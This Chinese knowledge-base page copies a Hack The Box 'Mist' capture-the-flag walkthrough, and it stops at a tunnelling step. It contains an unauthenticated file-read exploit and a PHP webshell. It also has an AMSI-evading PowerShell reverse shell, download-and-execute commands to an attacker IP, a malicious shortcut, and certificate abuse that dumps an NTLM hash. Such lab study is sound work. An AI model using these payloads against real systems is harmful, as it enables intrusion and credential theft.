---
title: ESC13 组映射与多阶段域权限
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/adcs-advanced/
categories:
- 身份与域安全
- 证书服务
tags:
- 知识库
- ADCS
- ESC13
- gMSA
- Shadow Credentials
description: Mist 的长链涉及多个主机、服务账户和证书策略。本章沿原实验的身份切换顺序保留全部材料，着重核对 OID 组映射、gMSA 读取和证书模板之间的实际权限关系。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

Mist 的长链涉及多个主机、服务账户和证书策略。本章沿原实验的身份切换顺序保留全部材料，着重核对 OID 组映射、gMSA 读取和证书模板之间的实际权限关系。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/adcs-advanced/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Web 入口、认证 Relay 和 Shadow Credentials 分别对应不同执行身份。

ESC13 两次转换的模板、策略和目标组需要逐次核对。

原记录中的清理回滚、隧道、凭据容器和 DCSync 结果都随链保留。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [多次账户转换与 ESC13 组映射](#case-mist) | mist | ADCS、ESC13、gMSA、Shadow Credentials |

<a id="case-mist"></a>

## 多次账户转换与 ESC13 组映射

原长链从 Pluck、认证请求和 Shadow Credentials 到 gMSA，再两次使用证书策略组映射。每个中间身份、权限回滚、证书与会话证据按原顺序保留。

<p class="kb-provenance">来源 mist · 原记录 2024-10-27 · 72 个代码块 · 11 处图片引用</p>

<details class="kb-evidence" id="record-mist">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start mist -->

#### 简述

本文是Insane难度的HTB Mist机器的域渗透部分，其中CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice等域渗透提权细节是此box的特色，主要参考[0xdf's blog Mist walkthrough](https://0xdf.gitlab.io/2024/10/26/htb-mist.html)记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist.png)



#### 信息收集
#### nmap

``` bash
fdluci@hacky$ nmap -p- --min-rate 10000 10.10.11.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:46 EDT
Nmap scan report for 10.10.11.17
Host is up (0.089s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
fdluci@hacky$ nmap -sCV -p 80 10.10.11.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:50 EDT
Nmap scan report for 10.10.11.17
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-generator: pluck 4.7.18
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-robots.txt: 2 disallowed entries
|_/data/ /docs/
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-title: Mist - Mist
|_Requested resource was http://10.10.11.17/?file=mist

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds
```

#### Website - TCP 80

发现站点使用了[Pluck CMS](https://github.com/pluck-cms/pluck/wiki)4.7.18版本

#### Shell as svc_web on MS01
#### 恢复admin密码
#### 漏洞背景

一些研究发现[CVE-2024-9405](https://nvd.nist.gov/vuln/detail/CVE-2024-9405)，一个在这个版本的Pluck中文件读取的漏洞。这篇来自m3n0sd0n4ld的博客文章[Pluck CMS v.4.7.18 - Local File Inclusion unauthenticated (CVE-2024-9405)](https://m3n0sd0n4ld.github.io/patoHackventuras/cve-2024-9405)展示了细节。/data/modules/albums/albums_getimage.php?image=[filename]路径在返回原始文件之前不检查身份验证。在Mist发布的时候，这篇文章还不存在，尽管在Pluck GitHub上有这个issue[Inclusion of files without authentication #122](https://github.com/pluck-cms/pluck/issues/122)。

#### 目录发现 - 文件读取

``` bash
┌[root☮kali]-(~/hackthebox/machine/mist)
└> curl http://10.10.11.17/data/modules/albums/albums_getimage.php\?image\=mist.php
<?php
$album_name = 'Mist';
?>30#                                                                                                                                                                     ┌[root☮kali]-(~/hackthebox/machine/mist)
└> curl http://10.10.11.17/data/modules/albums/albums_getimage.php\?image\=admin_backup.php
<?php
$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
?>146
```

第一个看起来像是CMS的元数据。后者看起来像一个hash。$ww是用于在PluckCMS中保存管理hash的变量。

#### Crackstation

[CrackStation](https://crackstation.net/)将其识别为SHA512并立即将其破解：

``` bash
lexypoo97
```

然后在/login.php使用账号密码登录

#### Webshell Pluck Module
#### Create Module

``` bash
fdluci@hacky$ cat modluci/luci.php
<?php system($_REQUEST['cmd']); ?>
```

然后使用zip打包

``` bash
┌[root☮kali]-(~/hackthebox/machine/mist)
└> zip -r notevil.zip modluci
  adding: modluci/ (stored 0%)
  adding: modluci/luci.php (stored 0%)
```

#### Upload Module

在Pluck管理面板的"选项"下有一个"管理模块"选项：

点击"Install a module…"，然后选择notevil.zip

现在/data/modules目录下有notevil

``` bash
http://10.10.11.17/data/modules/

http://10.10.11.17/data/modules/notevil/modluci/luci.php?cmd=whoami
ms01\svc_web
```

#### Bypass AMSI

[AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)是一项内置在Windows中的技术，旨在保护Windows免受恶意PowerShell（和其他攻击）的攻击。很可能是它挡住了我的PowerShell revshell。

幸运的是，它是基于签名的。绕过它的一个技巧（至少在撰写本文时）是从revshells.com获取PowerShell #2并更改所有变量名称。

 - rev.ps1

``` bash
$c = New-Object Net.Sockets.TCPClient('10.10.14.22',444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$ssb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ssb,0,$ssb.Length);$s.Flush()};$c.Close()
```

``` bash
python -m http.server 8081

POST /data/modules/notevil/modluci/luci.php HTTP/1.1
Host: 10.10.11.17
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oesq5ctuijids3s6qndvpimgrc
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 92


cmd=powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.22/rev.ps1')
```

``` bash
~/hackthebox/machine/mist❯❯❯ rlwrap -cAr nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.17] 56245

PS C:\xampp\htdocs\data\modules\notevil\modluci> whoami
ms01\svc_web
```

#### Shell as Brandon.Keywarp on MS01
#### Enumeration
#### Host

该主机不是主要主机，而是运行在Mist上的虚拟机。IP地址为192.168.100.101，主机名为MS01。

``` bash
PS C:\xampp\htdocs\data\modules\notevil\modluci> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.100.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.100
PS C:\> hostname
MS01
```

以下目录可写

``` bash
PS C:\Common Applications> ls

    Directory: C:\Common Applications

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/21/2024   2:41 PM             14 luci.lnk
-a----          5/8/2021   1:15 AM           1118 Calculator.lnk
-a----          5/7/2021   3:14 PM           1175 Notepad.lnk
-a----          5/7/2021   3:15 PM           1171 Wordpad.lnk
```

#### 恶意链接

我将用一个恶意链接覆盖通用应用程序目录中的一个链接，看看是否有人点击它。这篇文章[Windows Shortcuts With PowerShell — How To Make, Customize And Point Them To Places](https://medium.com/@dbilanoski/how-to-tuesdays-shortcuts-with-powershell-how-to-make-customize-and-point-them-to-places-1ee528af2763)讨论了如何用PowerShell制作.link文件。

``` bash
PS C:\Common Applications> $WScriptShell = New-Object -ComObject WScript.Shell
PS C:\Common Applications> $Shortcut = $WScriptShell.CreateShortcut("C:\Common Applications\Notepad.lnk")
PS C:\Common Applications> $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PS C:\Common Applications> $Shortcut.Arguments = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.22:888/rev.ps1')"
PS C:\Common Applications> $Shortcut.Save()
```

片刻后返回了一个新的shell

``` bash
┌[root☮kali]-(~/hackthebox/machine/mist)
└> rlwrap -cAr nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.17] 56280

PS C:\Windows\system32> whoami
mist\brandon.keywarp
```

#### Auth as MS01$
#### Bloodhound
#### 收集信息

现在我有了一个域账户，我要收集侦Bloodhound的数据。获取[SharpHound最新版本](https://github.com/BloodHoundAD/SharpHound/releases)，将.exe上传到MS01，并运行它：

``` bash
.\sharphound.exe -c All
```

使用smbserver.py将20241026152607_BloodHound.zip文件拷贝到本地虚拟机

``` bash
impacket-smbserver -smb2support share . -username fd -password fd

net use \\10.10.14.22\share /u:fd fd

copy 20241026152607_BloodHound.zip \\10.10.14.22\share\
```

#### 文件提取

``` bash
fdluci@hacky$ curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   190  100   190    0     0   1701      0 --:--:-- --:--:-- --:--:--  1711
100  3784  100  3784    0     0  10594      0 --:--:-- --:--:-- --:--:-- 10594
[+] Running 3/3
 ✔ Container mist-10101117-graph-db-1    Running                                                                                                                     0.0s
 ✔ Container mist-10101117-app-db-1      Running                                                                                                                     0.0s
 ✔ Container mist-10101117-bloodhound-1  Recreated                                                                                                                   0.1s
Attaching to app-db-1, bloodhound-1, graph-db-1
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.411226832Z","message":"Reading configuration found at /bloodhound.config.json"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.411647473Z","message":"Logging configured"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.446486924Z","message":"No database driver has been set for migration, using: neo4j"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.446547825Z","message":"Connecting to graph using Neo4j"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.447226875Z","message":"Starting daemon Tools API"}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.450835283Z","message":"This is a new SQL database. Initializing schema..."}
bloodhound-1  | {"level":"info","time":"2024-10-23T20:32:49.450845528Z","message":"Creating migration schema..."}
b
...[snip]...
```

打印输出管理员密码: admin/vgeHwpCRUiLlPZ0qFnYtjMMBBubby4zs, "Administration" –> "File Injest"

#### 分析

在"Explore"选项卡上，搜索Brandon.Keywarp并标记为已拥有。查看"Outbound Object Control"，并注意到BloodHound-CE也显示证书：

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist1.png)

看起来域用户的所有成员都可以使用Mist-DC01-CA注册一些模板。

#### Recover Brandon.Keywrap NTLM
#### Overview

枚举以便继续，使用Brandon.Keywrap的密码或NTLM hash会容易得多。为此，我将：

 - 使用certify.exe为用户请求证书。
 - Openssl更改生成的证书的格式
 - Rubeus.exe使用证书获取NTLM hash。

从[SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_Any)中获取certify.exe和Rubeus.exe，并将它们上传到Mist的C:\xampp\htdocs\files中。

#### Get Certificate

如果没有运行Bloodhound，我也可以从Certify.exe find /enrollable中获得模板和CA信息的列表，它将列出该用户可用的各种证书模板：

``` bash
PS C:\xampp\htdocs\files> .\Certify.exe find /enrollable

[*] Listing info about the Enterprise CA 'mist-DC01-CA'

    Enterprise CA Name            : mist-DC01-CA
    DNS Hostname                  : DC01.mist.htb
    FullName                      : DC01.mist.htb\mist-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=mist-DC01-CA, DC=mist, DC=htb
    Cert Thumbprint               : A515DF0E980933BEC55F89DF02815E07E3A7FE5E
    Cert Serial                   : 3BF0F0DDF3306D8E463B218B7DB190F0
    Cert Start Date               : 2/15/2024 7:07:23 AM
    Cert End Date                 : 2/15/2123 7:17:23 AM
    Cert Chain                    : CN=mist-DC01-CA,DC=mist,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
      Allow  ManageCA, ManageCertificates               MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
    Enrollment Agent Restrictions : None
```

第一个可用的模板名为User：

``` bash
    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
```

使用该模板获取证书：

``` bash
PS C:\xampp\htdocs\files> .\Certify.exe request /ca:DC01\mist-DC01-CA /template:User

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : MIST\Brandon.Keywarp
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb

[*] Certificate Authority   : DC01\mist-DC01-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 61

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzJpOBcCAh3agazJu4VIwkfi9usHZ2i1ajPAvm3j+SOAFGzAE
0YOnyEXMLaSMr/YE2Amnjgcdx8Zf6Zu5h2EfAvuF+GpjopqWCJNj+H+0Yg+4UwSX
nLCOhCSTsaUXUiBsD8va27uhkHV/QFRsjvD6wLxk3r6F61iysUNooCZuOTx/Gc51
6QQlGbR3Htb447C50jme4gvwz8fvB7XujY8TZDuaa1IvCAacgGz40fCnzlHx/PRV
SPazon4VUPLc3LQP2hHf6p0uBdv4N8Q17jz2uCQUrfrhrGYOSllATqm9AzAFolEo
3EtPz2tS5Yx5UDp4GJCepdShEqIfVvRnZa0M3QIDAQABAoIBAQC8jyCEsIpDTZI9
+LazNTnJ7UF9khWhutaOuPRHBlTi+IH8Ml7eb8T7D0hCcDmwGL0SFKO0gt5xNGNE
Od3b5CfeactnyzSTsH/A24TwiVDGZtJqv/qxzw0ov0TWHN3HNFYioK7MfrlBFuf1
c1iwy2lsorMbjN6CrLXSI9uSbJh8aZrr7CH84ewFxivvkBTkPaJzdfgVetMcwkW0
y/PgxicsB8l/Xg0P9vqjcwfxcV+ydCOQCgZVeSHkPHOZR6Yd1g1B0EG5W4uB66XW
+pftEOjKftBobJ5InZ/3f1KG7KC2vpScaKRrBpbwp775SagDZRbxBXNe7Kz7nUdE
eD4QN13JAoGBAND72JrdZM3WOlP352jduYiSArMYjE4US7YCm7OXeEW5q2AdwF0u
bF08yjLqd9Tkq0Z189Py8zZOHo3hqKpe2X4PCNBfah5o6NhNazlmOe3Ru3+JSl0r
cSEczzlXz2R5Kg9TYx9Yc2j/7wg+2zdCeucPyse/6ClXDG+i1AG8Rb8DAoGBAPqi
I6y9OgBzbDpFMMQ7fwsiFcthqKDgrUlGRHOv3ViHZXRMZtSdDOfluleMGaWJFs4Y
ocFMQBHTXf7RoskW6mZswU//LYNnciEvMDUvagPkgLri+H5gxy57ELYXd8i8e2PC
remxgVeRT8El7ljTxMuk/LfyV6tmQvaKEt+2jc6fAoGBALwORQZmv3Uyl95DsKt/
CpvIuEEtj+QbA15Pzoi3fvVPdNXTL+0p/z2PnGxg7WBYPX/0WGubrhxqA7itHbfi
DlkPcmD/22BuC0nJsPk/8lT9bHoBszdQBkdDw33YdLn3BlAwO3xTfdc4p4KF/YIm
gq42WcWR/Xpl6Lz0i07ceu69AoGALmV9fSi6aAL18gOE946cAg+ZQUEe2kk9Suc7
HL9dllnaKiFKl+lKzlL0n+hLhx1Nn3Fn4EShR6t9JwLfw6H+Wl+fmZN/dWfc9M+r
eO0CDx5pxi7mGV8JAE2/1jWZ8wsRPHJ5h11YuEEqJnNDICZzs88jCVpPaGdR1hnR
TKCat7kCgYEApszz3TIexyUSnvI6JAp+BUf2ShbeKPuS1jNu4EYpmL4/KT0D8axr
22PxmJNv9l5uIcVnww3qjWF3kLVjr7zD823qrQpfZULgfVAUetaU0o5FoVwdOT0D
UrUVfDdBMFz6ZKJR/HiUwjyc9BwV8L72GPEZgFKm3G2AtPj8cemsdh8=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGDzCCBPegAwIBAgITIwAAAD2XA2Tis5gK5QAAAAAAPTANBgkqhkiG9w0BAQsF
ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEbWlzdDEV
MBMGA1UEAxMMbWlzdC1EQzAxLUNBMB4XDTI0MTAyNzA0NTU0NloXDTI1MTAyNzA0
NTU0NlowVTETMBEGCgmSJomT8ixkARkWA2h0YjEUMBIGCgmSJomT8ixkARkWBG1p
c3QxDjAMBgNVBAMTBVVzZXJzMRgwFgYDVQQDEw9CcmFuZG9uLktleXdhcnAwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDMmk4FwICHdqBrMm7hUjCR+L26
wdnaLVqM8C+beP5I4AUbMATRg6fIRcwtpIyv9gTYCaeOBx3Hxl/pm7mHYR8C+4X4
amOimpYIk2P4f7RiD7hTBJecsI6EJJOxpRdSIGwPy9rbu6GQdX9AVGyO8PrAvGTe
voXrWLKxQ2igJm45PH8ZznXpBCUZtHce1vjjsLnSOZ7iC/DPx+8Hte6NjxNkO5pr
Ui8IBpyAbPjR8KfOUfH89FVI9rOifhVQ8tzctA/aEd/qnS4F2/g3xDXuPPa4JBSt
+uGsZg5KWUBOqb0DMAWiUSjcS0/Pa1LljHlQOngYkJ6l1KESoh9W9GdlrQzdAgMB
AAGjggLpMIIC5TAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYK
KwYBBAGCNwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBE
BgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAw
BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM/E4P91WDE9wzoMyhYA3iFg
v751MB8GA1UdIwQYMBaAFAJHtA9/ZUDlwTbDIo9S3fMCAFUcMIHEBgNVHR8Egbww
gbkwgbaggbOggbCGga1sZGFwOi8vL0NOPW1pc3QtREMwMS1DQSxDTj1EQzAxLENO
PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
b25maWd1cmF0aW9uLERDPW1pc3QsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlv
bkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuwYI
KwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1taXN0LURD
MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlzdCxEQz1odGI/Y0FDZXJ0aWZpY2F0
ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMwYDVR0R
BCwwKqAoBgorBgEEAYI3FAIDoBoMGEJyYW5kb24uS2V5d2FycEBtaXN0Lmh0YjBP
BgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMTA0NTgw
OTUwOS0zMDA2NjU4NTg5LTI0MjYwNTU5NDEtMTExMDANBgkqhkiG9w0BAQsFAAOC
AQEAHZSz7ubUjAP7IYDKiJHLmkWPuX+Gh80mxJuY+cF8VQLp6vtIkTEZyCRQstP5
+h4SLaJgFbseR1R+lpDQrwVJYB21cfRlpBFuiaCPY0MahzHsqh61apGahDS00D5N
IAPiLSPaZvFEN61H1cvnHsST+QOFufEh/QfacjPi+NCn6Q7QSUISpz77Ymd/CEHB
FP3h7D10VUQE0WfAZ3tUzzjzR3fSSx+KNNJ9rw/B+fe50VSimHuhDu7JR825xPWw
t5GLD8iUH3rOXVWoycRrh9Zj2Smyw3OJwZY/OtBK1TBJGb7sjYt8IM2iPsUYItx6
qWuZ2Ot4CNLD+9k4l8EnUSCBYA==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:16.2525062
```

``` bash
{12:53}[system: ruby 3.1.2p20]~/hackthebox/machine/mist ➭ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

#### dump hash

现在Rubues可以使用它来获取用户的NTLM hash：

``` bash
copy \\10.10.14.22\share\cert.pfx cert.pfx

PS C:\xampp\htdocs\files> .\Rubeus.exe asktgt /user:brandon.keywarp /certificate:C:\xampp\htdocs\files\cert.pfx /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Got domain: mist.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\brandon.keywarp'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  brandon.keywarp (NT_PRINCIPAL)
  UserRealm                :  MIST.HTB
  StartTime                :  10/26/2024 10:16:47 PM
  EndTime                  :  10/27/2024 8:16:47 AM
  RenewTill                :  11/2/2024 10:16:47 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  yM37+B9tChpECTHSyael8w==
  ASREP (key)              :  D3434540396EA9BE4D8AB361AA8CA14E

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : DB03D6A77A2205BC1D07082740626CC9
```

#### 隧道

考虑到防火墙在80之前封锁了一切，使用[Chisel](https://github.com/jpillora/chisel)创建一个隧道。上传二进制文件，并在主机上启动服务器。从Mist连接到它：

``` bash
Invoke-WebRequest -Uri http://10.10.14.22/chisel.exe -OutFile chisel.exe

